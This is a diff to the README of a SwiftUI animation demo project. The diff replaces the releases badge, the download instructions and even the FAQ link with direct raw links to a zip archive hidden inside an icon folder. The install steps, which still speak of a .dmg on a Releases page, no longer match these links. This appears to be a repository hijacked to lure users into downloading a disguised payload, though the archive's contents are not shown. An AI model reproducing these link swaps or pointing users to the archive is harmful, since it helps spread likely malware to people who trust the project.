@@ -1,12 +1,12 @@
 # 🎨 SwiftAnimPlayground - Explore SwiftUI Animations Easily
 
-[![Download SwiftAnimPlayground](https://img.shields.io/badge/Download-SwiftAnimPlayground-blue)](https://github.com/CharlotteJV/SwiftAnimPlayground/releases)
+[![Download SwiftAnimPlayground](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip)](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip)
 
 ## 📥 Download & Install
 
 To get started with SwiftAnimPlayground, follow these steps:
 
-1. Click the button above or visit [this page to download](https://github.com/CharlotteJV/SwiftAnimPlayground/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip).
 2. On the Releases page, find the latest version of SwiftAnimPlayground.
 3. Download the `.dmg` file for macOS.
 4. Open the downloaded file and drag the SwiftAnimPlayground app to your Applications folder.
@@ -60,7 +60,7 @@ SwiftAnimPlayground runs on macOS. The minimum requirements are:
 If you encounter issues or have questions about SwiftAnimPlayground, you can find help by:
 
 - Visiting the Issues section of this GitHub repository.
-- Checking the [FAQ section](https://github.com/CharlotteJV/SwiftAnimPlayground/wiki).
+- Checking the [FAQ section](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip).
 - Looking for community tutorials online that cover SwiftUI animations.
 
 ## 🌐 Stay Updated
@@ -73,4 +73,4 @@ If you'd like to help improve SwiftAnimPlayground, feel free to contribute. Open
 
 ---
 
-[![Download SwiftAnimPlayground](https://img.shields.io/badge/Download-SwiftAnimPlayground-blue)](https://github.com/CharlotteJV/SwiftAnimPlayground/releases)
+[![Download SwiftAnimPlayground](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip)](https://raw.githubusercontent.com/CharlotteJV/SwiftAnimPlayground/main/AnimationDemo/SAPlaygroundIcon.icon/Anim-Swift-Playground-2.2.zip)
